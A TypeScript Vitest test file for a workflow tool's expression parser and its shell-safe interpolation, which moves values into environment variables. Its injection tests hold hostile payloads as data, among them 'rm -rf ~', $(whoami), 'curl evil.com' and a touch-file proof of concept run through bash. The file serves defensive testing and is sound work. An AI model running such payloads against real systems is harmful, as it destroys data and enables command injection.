import { execFileSync } from 'node:child_process'
import type { StepResult } from '@overture/core'
import { describe, expect, it } from 'vitest'
import {
  type ExpressionContext,
  ExpressionEvaluationError,
  ExpressionSyntaxError,
  evaluateExpression,
  interpolate,
  interpolateForShell,
  parseExpression,
} from './expressions.js'

function stepResult(
  overrides: Partial<StepResult> & { stepId: string; status: StepResult['status'] },
): StepResult {
  return { outputs: {}, ...overrides }
}

function ctx(
  steps: readonly StepResult[] = [],
  vars: Record<string, unknown> = {},
): ExpressionContext {
  return { steps: new Map(steps.map((s) => [s.stepId, s])), vars }
}

const evalExpr = (source: string, context: ExpressionContext) =>
  evaluateExpression(parseExpression(source), context)

describe('literals', () => {
  it('parses string, number, and boolean literals', () => {
    expect(evalExpr("'hello'", ctx())).toBe('hello')
    expect(evalExpr('42', ctx())).toBe(42)
    expect(evalExpr('3.5', ctx())).toBe(3.5)
    expect(evalExpr('true', ctx())).toBe(true)
    expect(evalExpr('false', ctx())).toBe(false)
  })
})

describe('references', () => {
  const context = ctx(
    [
      stepResult({ stepId: 'review', status: 'failed', outputs: { title: 'PR title' } }),
      stepResult({ stepId: 'analyze', status: 'succeeded', outputs: { title: 'Analyze title' } }),
    ],
    { flag: 'yes', count: 3 },
  )

  it('resolves steps.<id>.status', () => {
    expect(evalExpr("steps.review.status == 'failed'", context)).toBe(true)
  })

  it('resolves steps.<id>.succeeded / failed / skipped sugar', () => {
    expect(evalExpr('steps.review.failed', context)).toBe(true)
    expect(evalExpr('steps.review.succeeded', context)).toBe(false)
    expect(evalExpr('steps.review.skipped', context)).toBe(false)
    expect(evalExpr('steps.analyze.succeeded', context)).toBe(true)
  })

  it('is equivalent to an explicit status comparison', () => {
    expect(evalExpr('steps.review.failed', context)).toBe(
      evalExpr("steps.review.status == 'failed'", context),
    )
  })

  it('resolves steps.<id>.outputs.<key>', () => {
    expect(evalExpr("steps.analyze.outputs.title == 'Analyze title'", context)).toBe(true)
  })

  it('resolves vars.<name>', () => {
    expect(evalExpr("vars.flag == 'yes'", context)).toBe(true)
    expect(evalExpr('vars.count == 3', context)).toBe(true)
  })

  it('throws a descriptive error for an unknown step id', () => {
    expect(() => evalExpr('steps.missing.succeeded', context)).toThrow(ExpressionEvaluationError)
    expect(() => evalExpr('steps.missing.succeeded', context)).toThrow(
      /unknown step reference 'steps.missing'/,
    )
  })

  it('throws a descriptive error for an unknown variable', () => {
    expect(() => evalExpr('vars.missing == 1', context)).toThrow(/unknown variable 'vars.missing'/)
  })
})

describe('operators', () => {
  const context = ctx()

  it('evaluates equality operators', () => {
    expect(evalExpr("'a' == 'a'", context)).toBe(true)
    expect(evalExpr("'a' == 'b'", context)).toBe(false)
    expect(evalExpr("'a' != 'b'", context)).toBe(true)
  })

  it('evaluates negation', () => {
    expect(evalExpr('!true', context)).toBe(false)
    expect(evalExpr('!false', context)).toBe(true)
    expect(evalExpr('!!true', context)).toBe(true)
  })

  it('evaluates && and ||', () => {
    expect(evalExpr('true && false', context)).toBe(false)
    expect(evalExpr('true || false', context)).toBe(true)
    expect(evalExpr('false || false', context)).toBe(false)
  })

  it('respects precedence: ! > == > && > ||', () => {
    // !false == true -> true == true -> true, then && false -> false, then || true -> true
    expect(evalExpr('!false == true && false || true', context)).toBe(true)
    // without parens, && binds tighter than ||
    expect(evalExpr('true || false && false', context)).toBe(true)
    expect(evalExpr('(true || false) && false', context)).toBe(false)
  })

  it('respects explicit parentheses', () => {
    expect(evalExpr("(1 == 1) && ('a' == 'a')", context)).toBe(true)
    expect(evalExpr('!(1 == 2)', context)).toBe(true)
  })
})

describe('parseExpression syntax errors', () => {
  it.each([
    ["'unterminated", 'unterminated string'],
    ['1 ===', 'unexpected'],
    ['(1 == 1', "expected ')'"],
    ['1 == 1)', 'trailing'],
    ['@', 'unexpected character'],
    ['vars', 'invalid reference'],
    ['steps.foo', 'invalid reference'],
    ['steps.foo.bar', 'invalid reference'],
    ['unknown.thing', 'unknown reference'],
  ])('rejects %j', (source, expectedMessage) => {
    expect(() => parseExpression(source)).toThrow(ExpressionSyntaxError)
    // substring match (not a RegExp): the expected fragments contain regex metacharacters
    // like `)` that would otherwise need escaping.
    expect(() => parseExpression(source)).toThrow(expectedMessage)
  })
})

describe('interpolate', () => {
  const context = ctx(
    [
      stepResult({
        stepId: 'analyze',
        status: 'succeeded',
        outputs: { title: 'Fix the bug', count: 2 },
      }),
    ],
    { test_command: 'npm test' },
  )

  it('resolves a single placeholder to its stringified value', () => {
    expect(interpolate('${{ vars.test_command }}', context)).toBe('npm test')
  })

  it('resolves multiple placeholders in one string', () => {
    expect(
      interpolate(
        'title: ${{ steps.analyze.outputs.title }} (${{ steps.analyze.outputs.count }})',
        context,
      ),
    ).toBe('title: Fix the bug (2)')
  })

  it('stringifies non-string values', () => {
    expect(interpolate('${{ steps.analyze.outputs.count }}', context)).toBe('2')
  })

  it('leaves plain text without placeholders untouched', () => {
    expect(interpolate('no placeholders here', context)).toBe('no placeholders here')
  })
})

describe('interpolateForShell', () => {
  const contextWith = (value: unknown) => ({
    steps: new Map<string, StepResult>(),
    vars: { title: value },
  })

  it('replaces a single placeholder with a quoted generated env-var reference', () => {
    const result = interpolateForShell('echo ${{ vars.title }}', contextWith('hello world'))
    expect(result.command).toBe('echo "$OVERTURE_VAR_0"')
    expect(result.env).toEqual({ OVERTURE_VAR_0: 'hello world' })
  })

  it('leaves plain text without placeholders untouched', () => {
    const result = interpolateForShell('npm test', contextWith('unused'))
    expect(result.command).toBe('npm test')
    expect(result.env).toEqual({})
  })

  it.each([
    ['double quote + semicolon', '"; rm -rf ~; echo "'],
    ['backtick command substitution', 'safe`whoami`safe'],
    ['dollar-paren command substitution', 'safe$(whoami)safe'],
    ['single quote', "safe'quote"],
    ['double quote', 'safe"quote'],
    ['newline', 'safe\nquote'],
    ['dollar sign alone', 'price: $5'],
    ['backslash', 'safe\\quote'],
  ])('never lets a %s payload appear in the command text, only in env', (_label, payload) => {
    const result = interpolateForShell('echo ${{ vars.title }}', contextWith(payload))
    expect(result.command).not.toContain(payload)
    expect(result.command).toBe('echo "$OVERTURE_VAR_0"')
    expect(result.env.OVERTURE_VAR_0).toBe(payload)
  })

  it('handles multiple distinct placeholders with sequential var names', () => {
    const ctx: ExpressionContext = {
      steps: new Map(),
      vars: { first: 'alpha', second: 'beta' },
    }
    const result = interpolateForShell('echo ${{ vars.first }} ${{ vars.second }}', ctx)
    expect(result.command).toBe('echo "$OVERTURE_VAR_0" "$OVERTURE_VAR_1"')
    expect(result.env).toEqual({ OVERTURE_VAR_0: 'alpha', OVERTURE_VAR_1: 'beta' })
  })

  it('gives the same var referenced twice its own generated variable each time', () => {
    const result = interpolateForShell('echo ${{ vars.title }} ${{ vars.title }}', contextWith('x'))
    expect(result.command).toBe('echo "$OVERTURE_VAR_0" "$OVERTURE_VAR_1"')
    expect(result.env).toEqual({ OVERTURE_VAR_0: 'x', OVERTURE_VAR_1: 'x' })
  })

  it('stays injection-safe even when the author wraps the placeholder in their own double quotes', () => {
    // Documented caveat: this loses word-splitting protection (the ""..."" form
    // expands $OVERTURE_VAR_0 unquoted in the middle), but the value's contents
    // are still never re-parsed as shell syntax, so it remains RCE-safe.
    const payload = '"; curl evil.com; echo "'
    const result = interpolateForShell('echo "${{ vars.title }}"', contextWith(payload))
    expect(result.command).toBe('echo ""$OVERTURE_VAR_0""')
    expect(result.command).not.toContain(payload)
    expect(result.env.OVERTURE_VAR_0).toBe(payload)
  })

  it('end-to-end: running the generated command through real bash echoes a malicious value verbatim, without executing it', () => {
    const payload =
      '$(touch /tmp/overture-shell-injection-poc-should-not-exist); `id`; "quoted"; \'quoted\''
    const { command, env } = interpolateForShell('echo ${{ vars.title }}', contextWith(payload))
    const output = execFileSync('/bin/bash', ['-c', command], {
      env: { ...process.env, ...env },
      encoding: 'utf8',
    })
    expect(output.trimEnd()).toBe(payload)
  })
})
